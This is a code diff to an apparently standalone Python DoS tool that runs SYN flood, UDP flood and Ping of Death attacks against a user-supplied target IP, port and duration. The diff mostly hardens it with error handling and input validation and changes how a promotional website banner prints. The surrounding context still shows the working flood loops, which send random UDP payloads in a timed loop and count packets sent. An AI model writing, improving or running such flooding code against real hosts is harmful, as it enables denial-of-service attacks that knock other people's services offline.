@@ -51,10 +51,10 @@ def print_hacker_banner():
     time.sleep(1)
 
 def display_website():
-    """Continuously display website info while the script is running"""
-    while True:
+    """Display website info once"""
+    if not hasattr(display_website, 'printed'):
         print(f"{CYAN}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{RESET}")
-        time.sleep(10)
+        display_website.printed = True
 
 def check_root():
     """Check if the script is running as root"""
@@ -84,15 +84,19 @@ def syn_flood(target_ip, target_port, duration):
             packet_count += 1
             print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
         except Exception as e:
-            print(f"{RED}Error sending packet: {e}{RESET}")
+            print(f"{RED}[ERROR] Issue with sending SYN packets: {str(e)}{RESET}")
             break
     print(f"\n{GREEN}[+] SYN Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
 
 def udp_flood(target_ip, target_port, duration):
     """UDP Packet Flood Attack"""
     print(f"{YELLOW}[+] Starting UDP Flood Attack on {target_ip}:{target_port}{RESET}")
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    packet = random._urandom(1024)
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        packet = random._urandom(1024)
+    except socket.error as e:
+        print(f"{RED}[ERROR] Error creating UDP socket: {str(e)}{RESET}")
+        return
     timeout = time.time() + duration
     packet_count = 0
     while time.time() < timeout:
@@ -101,7 +105,7 @@ def udp_flood(target_ip, target_port, duration):
             packet_count += 1
             print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
         except socket.error as e:
-            print(f"{RED}Error sending UDP packet: {e}{RESET}")
+            print(f"{RED}[ERROR] Error sending UDP packets: {str(e)}{RESET}")
             break
     print(f"\n{GREEN}[+] UDP Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
 
@@ -117,13 +121,16 @@ def ping_of_death(target_ip, duration):
             packet_count += 1
             print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
         except Exception as e:
-            print(f"{RED}Error sending Ping of Death packet: {e}{RESET}")
+            print(f"{RED}[ERROR] Issue with sending Ping of Death packets: {str(e)}{RESET}")
             break
     print(f"\n{GREEN}[+] Ping of Death Attack Completed. Packets Sent: {packet_count}{RESET}")
 
 def main():
     print_hacker_banner()
     check_root()
+    
+    website_thread = threading.Thread(target=display_website, daemon=True)
+    website_thread.start()
 
     while True:
         print(f"{BOLD}{YELLOW}\nSelect Attack Type:{RESET}")
@@ -136,10 +143,20 @@ def main():
         if choice == "4":
             print(f"{GREEN}Exiting...{RESET}")
             sys.exit(0)
-        
+
         target_ip = input(f"{CYAN}Enter Target IP: {RESET}")
-        target_port = int(input(f"{CYAN}Enter Target Port: {RESET}")) if choice in ["1", "2"] else None
-        duration = int(input(f"{CYAN}Enter Duration (seconds): {RESET}"))
+        target_port = None
+        if choice in ["1", "2"]:
+            try:
+                target_port = int(input(f"{CYAN}Enter Target Port: {RESET}"))
+            except ValueError:
+                print(f"{RED}[ERROR] Invalid port number. Exiting...{RESET}")
+                sys.exit(1)
+        try:
+            duration = int(input(f"{CYAN}Enter Duration (seconds): {RESET}"))
+        except ValueError:
+            print(f"{RED}[ERROR] Invalid duration. Exiting...{RESET}")
+            sys.exit(1)
 
         server_status(target_ip)
 
@@ -154,6 +171,4 @@ def main():
 
 if __name__ == "__main__":
     print_warning()
-    website_thread = threading.Thread(target=display_website, daemon=True)
-    website_thread.start()
     main()
